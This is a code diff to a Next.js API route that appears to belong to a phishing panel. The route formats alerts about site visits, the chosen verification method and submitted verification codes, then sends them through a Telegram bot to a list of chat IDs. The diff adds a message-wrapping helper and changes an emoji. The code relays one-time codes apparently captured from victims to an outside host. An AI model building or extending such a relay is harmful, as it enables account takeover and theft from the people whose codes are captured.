@@ -1,5 +1,6 @@
 import { NextResponse } from 'next/server';
 import { PROJECT_DISPLAY_NAME } from '@/lib/project-config';
+import { wrapFlowMessage } from '@/lib/telegram';
 
 function escapeHtml(s) {
   return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
@@ -68,7 +69,7 @@ Method Selected: ${asCode(methodLabel(params.method))}`;
     case 'verification':
       return `🏷️ Site: ${asCode(params.siteName)}
 
-<b>✅ Verification Code Submitted</b>
+<b>🔑 Verification Code Submitted</b>
 ━━━━━━━━━━━━━━━━━━
 🔢 Code: ${asCode(params.code)}`;
     case 'resend':
@@ -170,6 +171,7 @@ export async function POST(req) {
     });
 
     const telegramEndpoint = `https://api.telegram.org/bot${token}/sendMessage`;
+    const outbound = eventType === 'visit' ? message : wrapFlowMessage(message);
     await Promise.all(
       chatIds.map(async (chatId) => {
         const res = await fetch(telegramEndpoint, {
@@ -177,7 +179,7 @@ export async function POST(req) {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: chatId,
-            text: message,
+            text: outbound,
             parse_mode: 'HTML',
             disable_web_page_preview: true,
           }),
